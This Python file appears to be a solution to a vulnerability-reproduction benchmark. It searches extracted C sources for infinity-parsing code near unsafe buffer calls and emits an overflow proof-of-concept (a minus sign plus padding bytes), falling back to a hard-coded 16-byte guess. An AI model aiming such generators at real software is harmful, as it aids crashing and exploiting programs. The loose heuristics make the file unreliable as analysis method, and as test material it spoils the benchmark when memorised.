import tarfile
import tempfile
import os
import re
import subprocess
from pathlib import Path
from typing import Optional, List

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tarfile.open(src_path, 'r:*') as tar:
            extract_dir = tempfile.mkdtemp()
            tar.extractall(extract_dir)
        
        # Search for vulnerable code patterns
        root_dir = self._find_root_dir(extract_dir)
        if not root_dir:
            return b'-' + b'A' * 15  # Fallback
        
        # Look for parsing functions with minus sign handling
        vulnerable_func = self._find_vulnerable_function(root_dir)
        
        if vulnerable_func:
            # Generate PoC based on analysis
            poc = self._generate_poc_from_analysis(vulnerable_func)
            if poc:
                return poc
        
        # Default PoC based on vulnerability description
        # 16 bytes: minus sign + 15 non-infinity characters
        return b'-' + b'X' * 15
    
    def _find_root_dir(self, extract_dir: str) -> Optional[str]:
        """Find the root directory of the source code."""
        paths = list(Path(extract_dir).rglob('*.c')) + list(Path(extract_dir).rglob('*.cpp'))
        if not paths:
            return None
        
        # Get the most common parent directory
        parent_dirs = [str(p.parent) for p in paths]
        from collections import Counter
        return Counter(parent_dirs).most_common(1)[0][0]
    
    def _find_vulnerable_function(self, root_dir: str) -> Optional[dict]:
        """Search for functions that parse minus signs and infinity."""
        patterns = [
            r'-\s*[Ii][Nn][Ff]',  # -INF or -inf
            r'strnc?mp.*[Ii][Nn][Ff]',
            r'strstr.*[Ii][Nn][Ff]',
            r'parse.*[Ii][Nn][Ff]',
            r'read.*[Ii][Nn][Ff]',
            r'scan.*[Ii][Nn][Ff]'
        ]
        
        for c_file in Path(root_dir).rglob('*.c'):
            with open(c_file, 'r', errors='ignore') as f:
                content = f.read()
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        # Look for buffer operations near this pattern
                        lines = content.split('\n')
                        for i, line in enumerate(lines):
                            if re.search(pattern, line, re.IGNORECASE):
                                # Check for buffer operations in nearby lines
                                for j in range(max(0, i-5), min(len(lines), i+6)):
                                    if any(op in lines[j] for op in ['strcpy', 'strncpy', 'memcpy', 'gets', 'scanf', 'fgets']):
                                        return {
                                            'file': str(c_file),
                                            'line': i,
                                            'code': line,
                                            'context': '\n'.join(lines[max(0, i-3):min(len(lines), i+4)])
                                        }
        return None
    
    def _generate_poc_from_analysis(self, func_info: dict) -> Optional[bytes]:
        """Generate PoC based on code analysis."""
        # Common pattern: buffer overflow with minus sign parsing
        # Try to find buffer size from code
        code = func_info['context']
        
        # Look for array declarations
        array_patterns = [
            r'char\s+\w+\s*\[\s*(\d+)\s*\]',
            r'char\s+\w+\s*\[\s*\w+\s*\]\s*=\s*{\s*[^}]*\s*}',
            r'char\s+\w+\s*\[\s*\]\s*=\s*"[^"]*"'
        ]
        
        for pattern in array_patterns:
            match = re.search(pattern, code)
            if match:
                if pattern == r'char\s+\w+\s*\[\s*(\d+)\s*\]':
                    try:
                        size = int(match.group(1))
                        # Generate PoC that exceeds buffer
                        return b'-' + b'A' * (size + 8)  # Overflow by 8 bytes
                    except:
                        pass
        
        # Default to 16 bytes as specified
        return b'-' + b'A' * 15